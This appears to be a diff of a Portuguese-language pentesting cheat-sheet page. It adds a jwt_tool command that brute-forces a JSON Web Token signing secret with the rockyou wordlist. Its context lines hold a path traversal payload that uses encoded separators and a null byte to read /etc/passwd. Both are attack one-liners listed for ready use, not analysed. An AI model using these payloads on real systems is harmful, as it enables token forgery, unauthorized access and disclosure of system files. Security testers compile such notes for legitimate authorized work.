@@ -67,6 +67,10 @@ PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDO
 
 .
 
+	jwt_tool.py 'encript.payload.assinatura' --crack -d /usr/share/wordlists/rockyou.txt
+
+.
+
 	/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd%00
 
 .
